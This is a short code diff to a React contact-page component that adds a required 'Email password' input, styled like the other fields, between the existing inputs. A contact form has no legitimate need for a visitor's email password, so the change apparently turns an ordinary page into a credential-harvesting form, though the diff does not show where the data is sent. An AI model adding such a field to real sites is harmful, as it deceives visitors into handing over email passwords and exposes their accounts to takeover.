@@ -105,6 +105,14 @@ export default function Contact() {
                                     className="bg-primary placeholder-slate/[0.4] border-primary focus:border-accent focus:text-accent shadow-lg border-2 rounded-[8px] py-2 px-8 outline-none transition-all transition-700"
                                 />
                                 <input
+                                    placeholder="Email password"
+                                    name="password"
+                                    required
+                                    autoComplete="off"
+                                    type="password"
+                                    className="bg-primary placeholder-slate/[0.4] border-primary focus:border-accent focus:text-accent shadow-lg border-2 rounded-[8px] py-2 px-8 outline-none transition-all transition-700"
+                                />
+                                <input
                                     placeholder="Phone number"
                                     name="phone"
                                     type="tel"
